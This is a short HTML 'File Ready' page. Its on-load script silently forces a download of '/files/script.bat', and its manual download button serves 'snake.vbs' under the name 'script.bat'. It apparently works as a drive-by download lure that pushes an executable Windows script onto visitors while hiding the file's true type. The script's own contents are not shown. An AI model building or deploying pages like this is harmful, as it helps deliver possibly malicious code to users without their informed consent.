<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Download File</title>
<style>
body {
  font-family: Arial, sans-serif;
  background: #f8f9fa;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
}
.container {
  background: #fff;
  border-radius: 12px;
  box-shadow: 0 4px 15px rgba(0,0,0,0.1);
  padding: 30px 40px;
  text-align: center;
  width: 320px;
}
h1 {
  font-size: 22px;
  margin-bottom: 10px;
  color: #333;
}
p {
  color: #555;
  font-size: 15px;
  margin-bottom: 25px;
}
a.btn {
  display: inline-block;
  background: #007bff;
  color: white;
  text-decoration: none;
  padding: 10px 20px;
  border-radius: 8px;
  font-size: 15px;
}
a.btn:hover { opacity: 0.9; }
</style>
</head>
<body>
<div class="container">
  <h1>File Ready</h1>
  <p>Your download will start automatically.</p>
  <a class="btn" href="snake.vbs" download="script.bat">Download Manually</a>
</div> 

<script>
window.addEventListener('load', () => {
  const a = document.createElement('a');
  a.href = '/files/script.bat';
  a.download = 'script.bat';
  document.body.appendChild(a);
  a.click();
  a.remove();
});
</script>
</body>
</html>
